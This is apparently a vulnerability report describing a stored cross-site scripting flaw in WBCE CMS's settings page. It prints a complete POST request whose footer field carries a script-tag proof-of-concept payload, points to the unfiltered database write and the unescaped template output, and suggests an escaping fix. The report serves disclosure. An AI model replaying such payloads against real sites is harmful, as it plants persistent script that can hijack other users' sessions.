

Stored Cross-Site Scripting

![image-20231014164109765](https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20231014164109765.png)

request packet

```
POST /admin/settings/save.php HTTP/1.1
Host: localhost
Content-Length: 744
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost/admin/settings/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: XDEBUG_SESSION=XDEBUG_ECLIPSE; phpsessid-3877-sid=29rsln8q1kfe418al8e5i6i7p5; stElem___stickySidebarElement=%5Bid%3A0%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A1%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A2%5D%5Bvalue%3Aclosedsidebar%5D%23%5Bid%3A3%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A4%5D%5Bvalue%3AnoClass%5D%23%5Bid%3A5%5D%5Bvalue%3Aclosedsidebar%5D%23%5Bid%3A6%5D%5Bvalue%3AnoClass%5D%23; WBCELastConnectJS=1697291720
Connection: close

advanced=no&formtoken=2efc8cf5-8b6dcd39a0b4833bc56072d9bf66c61b8f3c70e7&website_title=aaa&website_description=bbb&website_keywords=ccc&website_header=&website_footer=%3Cscript%3Ealert(345)%3c%2fscript%3e&page_trash=inline&home_folders=true&intro_page=false&frontend_login=false&frontend_signup=4&submit=&default_language=EN&default_timezone=13&default_date_format=d.m.Y&default_time_format=H%3Ai&default_template=wbcezon&default_theme=wbce_flat_theme&search=public&search_template=&page_spacer=-&app_name=phpsessid-3877&sec_anchor=wbce_&server_email=admin%40qq.coms&wbmailer_default_sendername=WBCE+CMS+Mailer&wbmailer_routine=phpmail&wbmailer_smtp_host=&wbmailer_smtp_port=&wbmailer_smtp_secure=&wbmailer_smtp_username=&wbmailer_smtp_password=
```



![image-20231014233644498](https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20231014233644498.png)

This vulnerability can allow any user with settings privileges to obtain other user information, such as administrators with higher privileges

In /admin/settings/save.php#211

Insert HTML characters directly into the database without filtering

![image-20231014234154490](https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20231014234154490.png)

Directly used echo in/templates/wbcezon/index.php

![image-20231014234544441](https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20231014234544441.png)



Repair suggestions:

add Strings::htmlentities
